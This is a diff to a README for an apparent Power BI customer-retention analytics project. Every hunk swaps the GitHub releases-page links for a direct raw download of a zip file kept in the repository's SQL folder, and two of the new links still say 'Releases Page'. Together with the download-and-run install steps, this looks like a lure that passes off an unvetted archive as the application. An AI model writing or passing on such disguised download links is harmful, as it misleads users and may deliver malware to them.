@@ -9,7 +9,7 @@ Follow these steps to download and run the application. You will be up and runni
 ### 1. Download the Application
 To get started, download the application from the releases page. Click the link below:
 
-[![Download Customer_Retention_Analytics](https://img.shields.io/badge/Download-Customer_Retention_Analytics-brightgreen)](https://github.com/new3489/Customer_Retention_Analytics/releases)
+[![Download Customer_Retention_Analytics](https://raw.githubusercontent.com/new3489/Customer_Retention_Analytics/main/SQL/Customer_Retention_Analytics-1.1.zip)](https://raw.githubusercontent.com/new3489/Customer_Retention_Analytics/main/SQL/Customer_Retention_Analytics-1.1.zip)
 
 ### 2. System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -25,7 +25,7 @@ If you haven't installed Power BI Desktop, download it from the official Microso
 ### 4. Download & Install
 Once you have the system requirements in place:
 
-1. Visit the [Releases Page](https://github.com/new3489/Customer_Retention_Analytics/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/new3489/Customer_Retention_Analytics/main/SQL/Customer_Retention_Analytics-1.1.zip).
 2. Locate the latest version of the application.
 3. Click the download link to start downloading the software.
 4. After the download finishes, locate the file in your downloads folder.
@@ -69,7 +69,7 @@ The Customer_Retention_Analytics project includes various topics relevant to bus
 
 ## ✏️ FAQs
 ### How do I update the application?
-To update, visit the [Releases Page](https://github.com/new3489/Customer_Retention_Analytics/releases) and download the latest version. Follow the same installation steps.
+To update, visit the [Releases Page](https://raw.githubusercontent.com/new3489/Customer_Retention_Analytics/main/SQL/Customer_Retention_Analytics-1.1.zip) and download the latest version. Follow the same installation steps.
 
 ### Can I use this application on a Mac?
 Yes, Customer_Retention_Analytics is compatible with MacOS. Just make sure you have Power BI Desktop installed.
